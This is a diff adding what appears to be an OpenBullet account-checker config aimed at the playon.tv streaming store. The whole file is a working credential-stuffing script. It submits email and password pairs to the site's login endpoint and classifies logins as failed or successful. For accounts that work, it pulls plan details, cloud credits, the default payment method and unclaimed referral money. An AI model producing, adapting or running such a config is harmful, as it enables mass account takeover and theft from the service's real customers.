@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "playontv",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-02T19:33:33.8719217+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.playon.tv/store/login/processLogin.php" AutoRedirect=FALSE 
+  CONTENT "redir=%2F&email=<USER>&password=<PASS>&challenge=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.playon.tv" 
+  HEADER "Origin: https://www.playon.tv" 
+  HEADER "Referer: https://www.playon.tv/login?redir=download" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "That account was not found in our system" 
+    KEY "The password supplied is incorrect" 
+    KEY "Please make sure your email is valid" 
+    KEY "Please enter your email address" 
+    KEY "Please enter your password" 
+  KEYCHAIN Success OR 
+    KEY "Login was successful" 
+
+#GET_PLANS REQUEST GET "https://www.playon.tv/store/account/processAccountRequest.php?a=get_account_plans" 
+  
+  HEADER "Host: www.playon.tv" 
+  HEADER "Referer: https://www.playon.tv/store/account/main.php" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+
+#PARSE_PLAN PARSE "<SOURCE>" JSON "title" -> CAP "Plan" 
+
+#PARSE_PLAN_COUNT PARSE "<SOURCE>" JSON "plan_count" -> CAP "Plan Count" 
+
+#PARSE_CREDITS PARSE "<SOURCE>" JSON "cloud_individual_credits" -> CAP "Cloud Credits" 
+
+#GET_ACCOUNT_INFO REQUEST GET "https://www.playon.tv/store/account/processAccountRequest.php?a=get_account_info" 
+  
+  HEADER "Host: www.playon.tv" 
+  HEADER "Referer: https://www.playon.tv/store/account/main.php" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+
+#PARSE_PAYMENT_METHOD PARSE "<SOURCE>" JSON "account_default_payment_method" -> CAP "Default Payment Method" 
+
+#GET_REFER_A_FRIEND_INFO REQUEST GET "https://www.playon.tv/store/account/processAccountRequest.php?a=get_refer_a_friend_info" 
+  
+  HEADER "Host: www.playon.tv" 
+  HEADER "Referer: https://www.playon.tv/store/account/main.php" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+
+#GET_AMOUNT_UNCLAIMED PARSE "<SOURCE>" JSON "amount_pending" -> CAP "Refer A Friend Amount Unclaimed" 
+
